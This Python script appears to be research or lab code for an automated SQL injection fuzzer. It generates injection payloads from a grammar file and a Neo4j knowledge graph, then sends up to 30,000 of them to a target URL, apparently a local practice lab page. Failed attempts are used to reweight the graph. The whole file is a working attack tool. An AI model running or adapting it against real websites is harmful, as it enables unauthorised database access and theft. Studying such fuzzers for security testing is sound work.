import warnings
warnings.filterwarnings('ignore')
from urllib import request

# import numpy as np
# import pandas as pd
from py2neo import Node,Relationship,Graph,Path,Subgraph
from py2neo import NodeMatcher,RelationshipMatcher
from connect_neo4j import connect_neo4j

import time
import math
parse_modes = list()

p_list = []
choose_nodes = []
choose_edges = []
grammar_dic = {}
val_set = set()
ter_set = set()

bnf_rule_path = "../test5/Injection.g4"

def parse_grammar():
    
    # global grammar_dic

    file = open(bnf_rule_path, 'r', encoding='utf-8')
    for context in file.readlines():
        if context.startswith(("//","grammar")):
            pass
        elif ":" in context:
            # print(context)
            rule = context.strip()[:-1]
            attr_attr = rule.split(":", 1)

            key_attr = attr_attr[0].strip()
            value_attr = attr_attr[1].strip()

            grammar_dic[key_attr] = value_attr
            if "ter_" in key_attr:
                grammar_dic[key_attr] = value_attr.strip("'")

def print_grammar_dic():

    # global grammar_dic
    for key, value in grammar_dic.items():
        print("%s:%s"%(key, value))

def find_rule(name):

    # print(name)
    p_name = name+":"
    p_name_1 = name+" :"

    rule = ""

    # global p_list

    # print(type(p_list))
    bnf_rule_path = "grammar_test.g4"
    file = open(bnf_rule_path, 'r', encoding='utf-8')
    # with open(bnf_rule_path, 'r', encoding='utf-8') as file: 
    for context in file.readlines():
        if context.startswith(("//","grammar")):
            pass
        elif p_name in context or p_name_1 in context:
            # print(context)
            rule = context.strip()[:-1]
            break
    file.close()
    
    if " | " in rule:
        # print("pass")
        # choose_next_node(name)
        choose_name = choose_next_node(name)
        find_rule(choose_name)
    else:
        # print(rule)

        attr_attr = rule.split(":", 1)
        attr = attr_attr[1].strip()        
        c_attr_list = attr.split(' ')
        # print(rule)
        # print(c_attr_list)    
        for c_attr in c_attr_list:
            if ("mode_" not in c_attr):
                p_list.append(c_attr)

            else:
                find_rule(c_attr)
                
def choose_next_node(typename):

    # print(typename)
    node = node_matcher.match("Mode").where(typename=typename).first()
    # childs = list(relationship_matcher.match([node],r_type='mode_child'))
    childs = list(relationship_matcher.match([node],r_type=None))

    max_h_num = 0
    choose_one = 0
    i = 0

    if (len(childs)>1):
        for child in childs:
            h_num = child.get('h_num')
            if h_num > max_h_num:
                max_h_num = int(h_num)
                choose_one = i
            i += 1


    choose_node = childs[choose_one].end_node
    choose_nodes.append(choose_node)

    return choose_node['typename']

def choose_node_from_kg(data):

    node = node_matcher.match("mode").where(data=data).first()

    edges = list(relationship_matcher.match([node, None],r_type=None))

    max_p_c = 0
    for i in range(0, len(edges)):
        edge = edges[i]
        p_c = edge["p_c"]
        if p_c > max_p_c:
            max_p_c = p_c
            choose_one = i
    
    choose_node = edges[choose_one].end_node
    choose_nodes.append(choose_node)
    choose_edges.append(edges[choose_one])

    return choose_node["data"]

def search_grammar(data):

    if data in grammar_dic:
        rule = grammar_dic[data]

        if " | " in rule:
            choose_name = choose_node_from_kg(data)
            search_grammar(choose_name)
        else:
            c_attr_list = rule.split(' ') 
            for c_attr in c_attr_list:
                if ("mode_" in c_attr):
                    search_grammar(c_attr)
                else:
                    p_list.append(c_attr)
                    if ("val_" in c_attr):
                        val_set.add(c_attr)
                    else:
                        ter_set.add(c_attr)

def generate_payload():

    val_ter_dic = {}
    for val in val_set:
        node = node_matcher.match("val").first()
        edges = list(relationship_matcher.match([node,None],r_type="val-leaf"))

        choose_one = 0
        max_p_c = 0 

        for i in range(0, len(edges)):
            edge = edges[i]
            p_c = edge["p_c"]
            if p_c > max_p_c:
                max_p_c = p_c
                choose_one = i
        leaf_node = edges[choose_one].end_node
        val_ter_dic[val] = leaf_node["data"]

    for ter in ter_set:
        val_ter_dic[ter] = grammar_dic[ter]

    payload = ""
    for p in p_list:
        payload += val_ter_dic[p]

    return payload

def choose_payload():

    start_node = node_matcher.match("start").first()
    edges = list(relationship_matcher.match([start_node],r_type=None))

    max_p_c = 0
    for i in range(0, len(edges)):
        edge = edges[i]
        p_c = edge["p_c"]
        if p_c > max_p_c:
            max_p_c = p_c
            choose_one = i
    
    choose_node = edges[choose_one].end_node
    choose_nodes.append(choose_node)
    choose_edges.append(edges[choose_one])

    search_grammar(choose_node["data"])

def test_payload(payload):

    raw_url = "http://192.168.206.138/sqli/example1.php?name=root"
    url = raw_url + payload
    url = url.replace(" ", "%20")
    # print(payload)
    global test_num
    try:
        res = request.urlopen(url)
        test_num += 1
        # print(res.getcode())
        # if res.getcode() == 200:
        #     # print(res.read().decode('utf8'))
        #     return True
        # else:
        #     return False
        return res.getcode()
    except request.HTTPError as e:
        if hasattr(e, 'code'):
            # print("Error code: ", e.code)
            return e.code


def update_kg_after_test(res):

    node = node_matcher.match('start').first()
    total_layer = node["t_layer"]

    if res == 200:
        for edge in choose_edges:
            edge["p_v"] = 1
            edge["p_c"] = 1
            graph.push(edge)
    else:
        for edge in choose_edges:
            f_num = edge["f_num"]
            edge["f_num"] = f_num + 1
            k_layer = edge["layer"]
            if f_num+1>2:
                edge["p_v"] = round(1/(total_layer+1-k_layer) * math.log1p(f_num+1), 2)
                edge["p_c"] = round(edge["p_h"] * edge["p_v"], 2)
            graph.push(edge)

def main():
    # neo4j_url = 'http://localhost:7475'
    # user = 'neo4j'
    # pwd = 'adminadmin'

    # global graph
    # graph = Graph(neo4j_url,auth=(user,pwd),name='neo4j')

    # print(graph.schema.node_labels)

    # global node_matcher, relationship_matcher
    # node_matcher = NodeMatcher(graph)
    # relationship_matcher = RelationshipMatcher(graph)

    global graph
    graph  = connect_neo4j()
    global node_matcher, relationship_matcher
    node_matcher = NodeMatcher(graph)
    relationship_matcher = RelationshipMatcher(graph)

    parse_grammar()

    for i in range(30000):
        choose_payload()
        payload = generate_payload()
        res = test_payload(payload)
        if res == 200:
            break
        update_kg_after_test(res)

    # global p_list,choose_nodes
    # print(choose_nodes)
    # print(p_list)
    # print(payload)


if __name__ == '__main__':
    main()
    # parse_grammar()
    # print_grammar_dic()